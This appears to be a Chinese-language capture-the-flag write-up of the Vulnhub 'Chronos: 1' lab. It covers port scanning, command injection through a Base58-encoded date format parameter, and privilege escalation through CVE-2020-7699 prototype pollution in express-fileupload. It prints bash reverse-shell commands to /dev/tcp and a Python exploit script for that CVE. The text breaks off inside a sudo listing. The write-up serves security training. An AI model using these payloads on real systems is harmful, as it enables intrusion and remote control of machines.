{"pageProps":{"postData":{"id":"VulnhubChronos 1","contentHtml":"<h1>Chronos: 1</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/chronos-1,735/\">https://www.vulnhub.com/entry/chronos-1,735/</a></p>\n</blockquote>\n<p>ps：该靶机需要在hosts文件添加<code>chronos.local</code>记录，在官方地址上没有写</p>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>使用nmap扫描网段类存活主机</p>\n<p>因为靶机是我最后添加的，所以靶机IP是<code>7</code> ，<code>kali</code>是<code>10</code></p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.0</span>/<span class=\"hljs-number\">24</span>                       \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-15 22:44 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00036</span>s latency).\nMAC Address: <span class=\"hljs-number\">0</span>A:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">13</span> (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00042</span>s latency).\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">8</span>B:E9:<span class=\"hljs-title function_ invoke__\">B0</span> (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.7</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00033</span>s latency).\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:B0:C4:<span class=\"hljs-title function_ invoke__\">F0</span> (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.10</span>\n</code></pre>\n</li>\n<li>\n<p>扫描主机开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.7</span>  \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-15 22:44 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.7</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00048</span>s latency).\nNot shown: <span class=\"hljs-number\">65532</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp   open  ssh\n<span class=\"hljs-number\">80</span>/tcp   open  http\n<span class=\"hljs-number\">8000</span>/tcp open  http-alt\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:B0:C4:<span class=\"hljs-title function_ invoke__\">F0</span> (Oracle VirtualBox virtual NIC)\n</code></pre>\n</li>\n<li>\n<p>扫描主机服务版本以及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">8000</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.7</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-15 22:45 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.7</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00059</span>s latency).\n\nPORT     STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp   open  ssh     OpenSSH <span class=\"hljs-number\">7.6</span>p1 Ubuntu <span class=\"hljs-number\">4</span>ubuntu0.<span class=\"hljs-number\">3</span> (Ubuntu Linux; protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp   open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">29</span> ((Ubuntu))\n<span class=\"hljs-number\">8000</span>/tcp open  http    Node.js Express framework\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:B0:C4:<span class=\"hljs-title function_ invoke__\">F0</span> (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">4</span>.X|<span class=\"hljs-number\">5</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span>\nOS details: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.8</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">8000</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.7</span>                                                                                                                                                                   \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">15</span> <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">45</span> CST                                                                                                                                                 \nStats: <span class=\"hljs-number\">0</span>:04:<span class=\"hljs-number\">26</span> elapsed; <span class=\"hljs-number\">0</span> hosts completed (<span class=\"hljs-number\">1</span> up), <span class=\"hljs-number\">1</span> undergoing Script Scan                                                                                                                                         \nNSE Timing: About <span class=\"hljs-number\">98.99</span>% done; ETC: <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">50</span> (<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:03 remaining)                                                                                                                                                      \nStats: <span class=\"hljs-number\">0</span>:07:<span class=\"hljs-number\">32</span> elapsed; <span class=\"hljs-number\">0</span> hosts completed (<span class=\"hljs-number\">1</span> up), <span class=\"hljs-number\">1</span> undergoing Script Scan                                                                                                                                         \nNSE Timing: About <span class=\"hljs-number\">98.99</span>% done; ETC: <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">53</span> (<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:05 remaining)                                                                                                                                                      \nStats: <span class=\"hljs-number\">0</span>:07:<span class=\"hljs-number\">33</span> elapsed; <span class=\"hljs-number\">0</span> hosts completed (<span class=\"hljs-number\">1</span> up), <span class=\"hljs-number\">1</span> undergoing Script Scan                                                                                                                                         \nNSE Timing: About <span class=\"hljs-number\">98.99</span>% done; ETC: <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">53</span> (<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:05 remaining)                                                                                                                                                      \nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.7</span>                                                                                                                                                                                  \nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00057</span>s latency).                                                                      \n                                                                                                    \nPORT     STATE SERVICE  \n<span class=\"hljs-number\">22</span>/tcp   <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http     \n|_http-csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.                                                     \n|_http-stored-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> stored XSS vulnerabilities.                                         \n| http-enum:                                                                                        \n|_  /css/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.29 (ubuntu)'</span>   \n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.                               \n8000/tcp open  http-alt                                                                             \n| http-vuln-cve2011-3192:                           \n|   VULNERABLE:                                   \n|   Apache byterange filter DoS                     \n|     State: VULNERABLE                                                                             \n|     IDs:  CVE:CVE-2011-3192  BID:49303\n|       The Apache web server is vulnerable to a denial of service attack when numerous\n|       overlapping byte ranges are requested.      \n|     Disclosure date: 2011-08-19                                                                   \n|     References:                                   \n|       https://seclists.org/fulldisclosure/2011/Aug/175                                                 \n|       https://www.securityfocus.com/bid/49303     \n|       https://www.tenable.com/plugins/nessus/55976                                                     \n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192\n| http-slowloris-check:                                                                             \n|   VULNERABLE:                                                                                     \n|   Slowloris DOS attack                                                                            \n|     State: LIKELY VULNERABLE                      \n|     IDs:  CVE:CVE-2007-6750                     \n|       Slowloris tries to keep many connections to the target web server open and hold                  \n|       them open as long as possible.  It accomplishes this by opening connections to              \n|       the target web server and sending a partial request. By doing so, it starves                     \n|       the http server'</span>s resources causing Denial Of Service.                         \n|                                                   \n|     Disclosure date: <span class=\"hljs-number\">2009</span>-09-<span class=\"hljs-number\">17</span>                                                                   \n|     References:                                   \n|       https://cve.mitre.org/cgi-<span class=\"hljs-built_in\">bin</span>/cvename.cgi?name=CVE-<span class=\"hljs-number\">2007</span>-<span class=\"hljs-number\">6750</span>                                     \n|_      http://ha.ckers.org/slowloris/              \nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:B0:C4:F0 (Oracle VirtualBox virtual NIC)\n</code></pre>\n</li>\n</ol>\n<h2>web渗透</h2>\n<h3>80端口</h3>\n<ol>\n<li>\n<p>访问主页</p>\n<p><img src=\"/post-images/VulnhubChronos%201/image93.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>扫描目录</p>\n<pre><code class=\"hljs language-python\">gobuster <span class=\"hljs-built_in\">dir</span> -u http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.7</span> -w /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt -x php,html,<span class=\"hljs-built_in\">zip</span>,txt | grep -v <span class=\"hljs-string\">\"403\"</span>                                                            \n===============================================================\nGobuster v3<span class=\"hljs-number\">.6</span>\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.7</span>\n[+] Method:                  GET\n[+] Threads:                 <span class=\"hljs-number\">10</span>\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt\n[+] Negative Status codes:   <span class=\"hljs-number\">404</span>\n[+] User Agent:              gobuster/<span class=\"hljs-number\">3.6</span>\n[+] Extensions:              php,html,<span class=\"hljs-built_in\">zip</span>,txt\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/index.html           (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">1887</span>]\n/css                  (Status: <span class=\"hljs-number\">301</span>) [Size: <span class=\"hljs-number\">310</span>] [--> http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.7</span>/css/]\nProgress: <span class=\"hljs-number\">1102800</span> / <span class=\"hljs-number\">1102805</span> (<span class=\"hljs-number\">100.00</span>%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<ul>\n<li><code>/css</code> 是存放<code>css</code>的文件夹</li>\n</ul>\n<p>没找到别的东西</p>\n</li>\n</ol>\n<h3>8000端口</h3>\n<ol>\n<li>\n<p>访问主页</p>\n<p><img src=\"/post-images/VulnhubChronos%201/image94.png\" alt=\"image.png\"></p>\n<p>就是没了样式的<code>80</code>端口主页，不过看<code>80</code>端口的控制台可以知道，<code>80</code>端口是向<code>8000</code>端口请求的</p>\n<p><img src=\"/post-images/VulnhubChronos%201/image95.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>目录扫描</p>\n<pre><code class=\"hljs language-python\">obuster <span class=\"hljs-built_in\">dir</span> -u http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.7</span>:<span class=\"hljs-number\">8000</span> -w /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt -x php,html,<span class=\"hljs-built_in\">zip</span>,txt | grep -v <span class=\"hljs-string\">\"403\"</span> \n===============================================================\nGobuster v3<span class=\"hljs-number\">.6</span>\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.7</span>:<span class=\"hljs-number\">8000</span>\n[+] Method:                  GET\n[+] Threads:                 <span class=\"hljs-number\">10</span>\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt\n[+] Negative Status codes:   <span class=\"hljs-number\">404</span>\n[+] User Agent:              gobuster/<span class=\"hljs-number\">3.6</span>\n[+] Extensions:              php,html,<span class=\"hljs-built_in\">zip</span>,txt\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/date                 (Status: <span class=\"hljs-number\">500</span>) [Size: <span class=\"hljs-number\">1064</span>]\n/Date                 (Status: <span class=\"hljs-number\">500</span>) [Size: <span class=\"hljs-number\">1064</span>]\nProgress: <span class=\"hljs-number\">1102800</span> / <span class=\"hljs-number\">1102805</span> (<span class=\"hljs-number\">100.00</span>%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>扫描出<code>/Date</code>和<code>/date</code> ，两个页面是一样的，返回以下字符</p>\n<pre><code class=\"hljs language-python\">TypeError: Expected String\n    at decodeUnsafe (/opt/chronos/node_modules/base-x/src/index.js:<span class=\"hljs-number\">66</span>:<span class=\"hljs-number\">45</span>)\n    at Object.decode (/opt/chronos/node_modules/base-x/src/index.js:<span class=\"hljs-number\">113</span>:<span class=\"hljs-number\">18</span>)\n    at /opt/chronos/app.js:<span class=\"hljs-number\">25</span>:<span class=\"hljs-number\">24</span>\n    at Layer.handle [<span class=\"hljs-keyword\">as</span> handle_request] (/opt/chronos/node_modules/express/lib/router/layer.js:<span class=\"hljs-number\">95</span>:<span class=\"hljs-number\">5</span>)\n    at <span class=\"hljs-built_in\">next</span> (/opt/chronos/node_modules/express/lib/router/route.js:<span class=\"hljs-number\">137</span>:<span class=\"hljs-number\">13</span>)\n    at Route.dispatch (/opt/chronos/node_modules/express/lib/router/route.js:<span class=\"hljs-number\">112</span>:<span class=\"hljs-number\">3</span>)\n    at Layer.handle [<span class=\"hljs-keyword\">as</span> handle_request] (/opt/chronos/node_modules/express/lib/router/layer.js:<span class=\"hljs-number\">95</span>:<span class=\"hljs-number\">5</span>)\n    at /opt/chronos/node_modules/express/lib/router/index.js:<span class=\"hljs-number\">281</span>:<span class=\"hljs-number\">22</span>\n    at Function.process_params (/opt/chronos/node_modules/express/lib/router/index.js:<span class=\"hljs-number\">335</span>:<span class=\"hljs-number\">12</span>)\n    at <span class=\"hljs-built_in\">next</span> (/opt/chronos/node_modules/express/lib/router/index.js:<span class=\"hljs-number\">275</span>:<span class=\"hljs-number\">10</span>)\n</code></pre>\n</li>\n<li>\n<p>仔细看上面回显的报错，可以知道是<code>Node.js</code> ，以及<code>express</code> 一个流行的 <code>Node.js Web</code> 框架，可能是一个基于 <code>Node.js</code> 和 <code>Express.js</code> 的 <code>Web</code> 应用（将报错的提示直接喂给chatgpt即可）</p>\n<p>下面是GPT的解释：</p>\n<p>这个错误 <code>TypeError: Expected String</code> 通常是由于某个函数期望传入一个字符串类型的参数，但实际接收到了其他类型的数据（例如 <code>undefined</code>、<code>null</code> 或对象等）。在你遇到的情况中，问题出现在 <code>base-x</code> 包的 <code>decodeUnsafe</code> 函数中，这个包是用来进行 base 编码（如 Base64 或 Base58）的编码和解码操作。</p>\n<p><img src=\"/post-images/VulnhubChronos%201/image96.png\" alt=\"image.png\"></p>\n<p>回到前面，我们注意到了<code>80</code>端口也是请求的<code>8000</code>端口的<code>/date</code> ，参数是<code>format</code> ，后面跟着的应该是<code>Base64</code> 或 <code>Base58</code> ，而我们直接访问<code>/date</code>不加参数（<code>undefined</code>、<code>null</code>）就会造成上面的报错<code>TypeError</code></p>\n</li>\n<li>\n<p>复制<code>80</code>端口请求<code>8000</code>端口<code>/date</code>的包后面的参数进行解码</p>\n<pre><code class=\"hljs language-python\">4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL\n</code></pre>\n<p>尝试后可得知是<code>Base58</code> ，解码出来是</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-string\">'+Today is %A, %B %d, %Y %H:%M:%S.'</span>\n</code></pre>\n<p>就是<code>80</code>端口上的时间</p>\n<p><img src=\"/post-images/VulnhubChronos%201/image97.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>我们尝试将其修改为别的字符串，看看能不能修改</p>\n<ul>\n<li>\n<p>将<code>'+Today is TESTTEST %A, %B %d, %Y %H:%M:%S.'</code>通过<code>base58</code>编码后得到 <code>DjerGPjfzgpppwBPtBUY9XHKb6yTharNX81g3tSBJ3hJdABPG8Bj1gnmwWqc</code></p>\n</li>\n<li>\n<p>刷新<code>80</code>端口主页，抓包，修改<code>/date</code>后的参数为我们修改过</p>\n<p><img src=\"/post-images/VulnhubChronos%201/image98.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>修改后放行，回到浏览器查看</p>\n<p><img src=\"/post-images/VulnhubChronos%201/image99.png\" alt=\"image.png\"></p>\n<p>是可以修改的，这里可能是突破点</p>\n</li>\n</ul>\n</li>\n<li>\n<p>我们将注意力放在<code>'+Today is TESTTEST %A, %B %d, %Y %H:%M:%S.'</code> ，将其投喂给<code>GPT</code>后发现不是<code>Node.js</code></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># GPT 原话</span>\n在 Node.js 中，这样的格式化字符串一般不会直接使用像 %A、%B 这样的占位符，\n因为 JavaScript（包括 Node.js）的日期时间处理方式和其他语言（如 Python）有所不同。\n</code></pre>\n<p>最后得知是<code>Linux</code>中的<code>Date</code>命令</p>\n<p><img src=\"/post-images/VulnhubChronos%201/image100.png\" alt=\"image.png\"></p>\n<p>很难不怀疑是命令执行</p>\n</li>\n<li>\n<p>通过使用<code>Linux</code>构造命令，然后进行编码尝试是否存在命令执行</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-string\">'+Today is TESTTEST %A, %B %d, %Y %H:%M:%S.'</span> | ls\n</code></pre>\n<p>会将前面的结果传递给后面的命令作为命令，但是<code>ls</code>不接受前面的结果，所以会直接执行<code>ls</code></p>\n<p>进行<code>Base58</code>编码</p>\n<pre><code class=\"hljs language-python\">7LpzQUvtAU8ezh7iNvMhdy7bv2ZW8RaxEkthfeUDjBN2WGYxytPqosuP9BtJfrTBUSn\n</code></pre>\n<p>然后通过上面抓包的方式将参数进行替换后</p>\n<p><img src=\"/post-images/VulnhubChronos%201/image101.png\" alt=\"image.png\"></p>\n<p>可以发现将<code>ls</code>的结果打印出来了</p>\n</li>\n</ol>\n<h3>尝试获得shell</h3>\n<ol>\n<li>\n<p>将参数修改为反弹<code>shell</code>的命令（<code>192.168.56.10</code>是<code>kali</code>）</p>\n<p>PS:突然发现较新的靶机都不能直接通过<code>nc</code>来反弹<code>shell</code>，需要通过<code>bash</code>来反弹</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-string\">'+Today is TESTTEST %A, %B %d, %Y %H:%M:%S.'</span> | bash -c <span class=\"hljs-string\">\"bash -i >&#x26; /dev/tcp/192.168.56.10/1234 0>&#x26;1\"</span>\n</code></pre>\n<p>编码后得到</p>\n<pre><code class=\"hljs language-python\">2XHxFqgRgHdnuw7ymykTgiqjFXsf7ew4NHNWzh32oWPcBSFmAv79MRw4ezcAFwUUe6V4GMCkMRUE7T3Lc6JBiNLaBMPiw9rTgpKdigK4HxoDBDDYcfF7bTLgcaRMj63ozzHBCUA6M\n</code></pre>\n</li>\n<li>\n<p><code>kali</code>开启监听，然后抓包将参数替换，可以发现已经反弹成功了</p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~/Desktop]\n└─<span class=\"hljs-comment\"># nc -lvp 1234                                </span>\nlistening on [<span class=\"hljs-built_in\">any</span>] <span class=\"hljs-number\">1234</span> ...\n\nconnect to [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.10</span>] <span class=\"hljs-keyword\">from</span> chronos.local [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.7</span>] <span class=\"hljs-number\">41632</span>\nbash: cannot <span class=\"hljs-built_in\">set</span> terminal process group (<span class=\"hljs-number\">808</span>): Inappropriate ioctl <span class=\"hljs-keyword\">for</span> device\nbash: no job control <span class=\"hljs-keyword\">in</span> this shell\nwww-data@chronos:/opt/chronos$ \nwww-data@chronos:/opt/chronos$ \n</code></pre>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-python\">www-data@chronos:/opt/chronos$ whoami\nwww-data\nwww-data@chronos:/opt/chronos$ <span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">33</span>(www-data) gid=<span class=\"hljs-number\">33</span>(www-data) groups=<span class=\"hljs-number\">33</span>(www-data)\nwww-data@chronos:/opt/chronos$ uname -a\nLinux chronos <span class=\"hljs-number\">4.15</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">151</span>-generic <span class=\"hljs-comment\">#157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>\n</code></pre>\n</li>\n<li>\n<p>寻找突破点</p>\n<ul>\n<li>\n<p><code>SUID</code>，无可利用</p>\n</li>\n<li>\n<p><code>/opt/</code>下存在<code>chronos-v2</code>文件夹（靶机下存在这些文件夹，大概是突破口了），查看其后端文件夹<code>/opt/chronos-v2/backend</code></p>\n<p>存在<code>server.js</code></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># server.js </span>\nconst express = require(<span class=\"hljs-string\">'express'</span>);\nconst fileupload = require(<span class=\"hljs-string\">\"express-fileupload\"</span>);\nconst http = require(<span class=\"hljs-string\">'http'</span>)\n\nconst app = express();\n\napp.use(fileupload({ parseNested: true }));\n\napp.<span class=\"hljs-built_in\">set</span>(<span class=\"hljs-string\">'view engine'</span>, <span class=\"hljs-string\">'ejs'</span>);\napp.<span class=\"hljs-built_in\">set</span>(<span class=\"hljs-string\">'views'</span>, <span class=\"hljs-string\">\"/opt/chronos-v2/frontend/pages\"</span>);\n\napp.get(<span class=\"hljs-string\">'/'</span>, (req, res) => {\n   res.render(<span class=\"hljs-string\">'index'</span>)\n});\n\nconst server = http.Server(app);\nconst addr = <span class=\"hljs-string\">\"127.0.0.1\"</span>\nconst port = <span class=\"hljs-number\">8080</span>;\nserver.listen(port, addr, () => {\n   console.log(<span class=\"hljs-string\">'Server listening on '</span> + addr + <span class=\"hljs-string\">' port '</span> + port);\n});\nwww-data@chronos:/opt/chronos-v2/backend$ \n</code></pre>\n<p>可以看到 <code>express-fileupload</code> 存在文件上传，并开启在<code>8080</code>端口，因为<code>const addr = \"127.0.0.1\"</code> 为本地环回地址，所以只能在本机上访问到，怪不得扫描不到</p>\n</li>\n</ul>\n</li>\n<li>\n<p>重点是<code>express-fileupload</code> ，网上查阅其漏洞</p>\n<ul>\n<li>\n<p>可以在<code>package.json</code> 下找到它的版本号<code>1.1.7-alpha.3</code></p>\n<pre><code class=\"hljs language-python\">cat package.json\n{\n  <span class=\"hljs-string\">\"name\"</span>: <span class=\"hljs-string\">\"some-website\"</span>,\n  <span class=\"hljs-string\">\"version\"</span>: <span class=\"hljs-string\">\"1.0.0\"</span>,\n  <span class=\"hljs-string\">\"description\"</span>: <span class=\"hljs-string\">\"\"</span>,\n  <span class=\"hljs-string\">\"main\"</span>: <span class=\"hljs-string\">\"server.js\"</span>,\n  <span class=\"hljs-string\">\"scripts\"</span>: {\n    <span class=\"hljs-string\">\"start\"</span>: <span class=\"hljs-string\">\"node server.js\"</span>\n  },\n  <span class=\"hljs-string\">\"author\"</span>: <span class=\"hljs-string\">\"\"</span>,\n  <span class=\"hljs-string\">\"license\"</span>: <span class=\"hljs-string\">\"ISC\"</span>,\n  <span class=\"hljs-string\">\"dependencies\"</span>: {\n    <span class=\"hljs-string\">\"ejs\"</span>: <span class=\"hljs-string\">\"^3.1.5\"</span>,\n    <span class=\"hljs-string\">\"express\"</span>: <span class=\"hljs-string\">\"^4.17.1\"</span>,\n    <span class=\"hljs-string\">\"express-fileupload\"</span>: <span class=\"hljs-string\">\"^1.1.7-alpha.3\"</span>\n  }\n}\n</code></pre>\n</li>\n<li>\n<p><strong><code>CVE-2020-7699</code> 找到漏洞RCE</strong></p>\n<blockquote>\n<p><a href=\"https://www.freebuf.com/vuls/246029.html\">https://www.freebuf.com/vuls/246029.html</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://www.freebuf.com/articles/web/322857.html\">https://www.freebuf.com/articles/web/322857.html</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://www.bleepingcomputer.com/news/security/nodejs-module-downloaded-7m-times-lets-hackers-inject-code/\">https://www.bleepingcomputer.com/news/security/nodejs-module-downloaded-7m-times-lets-hackers-inject-code/</a></p>\n</blockquote>\n<p>本菜鸡没看懂，要学习<code>Node.js</code>污染原型链，本菜鸡没学过，大概知道要怎么利用</p>\n<p>大概就是将数据包里的的<code>name</code>改为</p>\n<pre><code class=\"hljs language-markdown\"><span class=\"hljs-strong\">__proto__</span>.outputFunctionName\n</code></pre>\n<p>然后将值改为：</p>\n<pre><code class=\"hljs language-scss\"><span class=\"hljs-attribute\">x</span>;process<span class=\"hljs-selector-class\">.mainModule</span><span class=\"hljs-selector-class\">.require</span>('child_process')<span class=\"hljs-selector-class\">.exec</span>('bash -c \"bash -i &#x26;> /dev/tcp/ip/prot <span class=\"hljs-number\">0</span>>&#x26;<span class=\"hljs-number\">1</span>\"');<span class=\"hljs-attribute\">x</span>\n</code></pre>\n<p>当我们再次发起请求时，便会在指定的主机反弹回来一个<code>shell</code>，从而达到RCE的目的</p>\n<p>其实在上面的链接也给出了利用脚本</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-keyword\">import</span> requests\n\ncmd = <span class=\"hljs-string\">'bash -c \"bash -i &#x26;> /dev/tcp/192.168.56.10/8888 0>&#x26;1\"'</span>\n\n<span class=\"hljs-comment\"># pollute</span>\nrequests.post(<span class=\"hljs-string\">'http://127.0.0.1:8080'</span>, files = {<span class=\"hljs-string\">'__proto__.outputFunctionName'</span>: (\n    <span class=\"hljs-literal\">None</span>, <span class=\"hljs-string\">f\"x;console.log(1);process.mainModule.require('child_process').exec('<span class=\"hljs-subst\">{cmd}</span>');x\"</span>)})\n\n<span class=\"hljs-comment\"># execute command</span>\nrequests.get(<span class=\"hljs-string\">'http://127.0.0.1:8080'</span>)\n</code></pre>\n<p>我们将脚本改名为<code>shell.py</code>然后上传到靶机进行利用</p>\n</li>\n<li>\n<p>存放在靶机的<code>/tmp</code>目录里，同时<code>kali</code>监听<code>8888</code>端口，执行脚本（使用<code>python3</code>执行）</p>\n<p>可以看到已经反弹到<code>8888</code>端口了</p>\n<p><img src=\"/post-images/VulnhubChronos%201/image102.png\" alt=\"image.png\"></p>\n<p>用户是<code>imera</code></p>\n</li>\n</ul>\n</li>\n<li>\n<p>在该用户家目录下存在<code>flag</code>文件</p>\n<pre><code class=\"hljs language-python\">imera@chronos:~$ cat user.txt\nbyBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK\n</code></pre>\n</li>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-python\">imera@chronos:/opt/chronos-v2/backend$ sudo -l\nsudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> imera on chronos:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\\:/snap/<span class=\"hljs-built_in\">bin</span>\n\nUser imera may run the following commands on chronos:\n    (ALL) NOPASSWD: /usr/local/<span class=\"hljs-built_in\">bin</span>/npm *\n    (ALL) NOPASSWD: 